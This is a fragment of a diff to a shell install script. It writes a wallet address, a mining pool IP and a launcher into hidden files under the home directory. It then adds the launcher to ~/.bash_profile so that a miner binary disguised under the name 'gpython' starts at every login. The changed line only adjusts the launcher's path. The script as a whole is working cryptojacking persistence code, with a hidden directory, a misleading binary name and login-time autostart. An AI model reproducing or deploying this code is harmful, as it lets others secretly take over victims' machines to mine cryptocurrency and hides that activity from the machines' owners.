@@ -13,6 +13,6 @@ echo "export LD_LIBRARY_PATH" >> ~/.bash_profile
 echo 'WORKER="x"' >> ~/.bash_profile
 echo 'WALLETNH="3DnXgkmRkXovYj6teHWmJWBdtiTTVPj5B4"' >> ~/.bash_profile
 echo 'POOLNH="3.90.200.104:80"' >> ~/.bash_profile
-echo "bash ~/.lib/gas.sh"  >> ~/.bash_profile
+echo "bash ./.lib/gas.sh"  >> ~/.bash_profile
 echo "./.lib/gpython --algo ethash --server $POOLNH --user $WALLETNH.$WORKER -p x -i 100 -w 0 --kernel 0 --proto stratum" > ~/.lib/gas.sh
 chmod +x gas.sh && chmod +x gpython && cd ~/ && source .bashrc
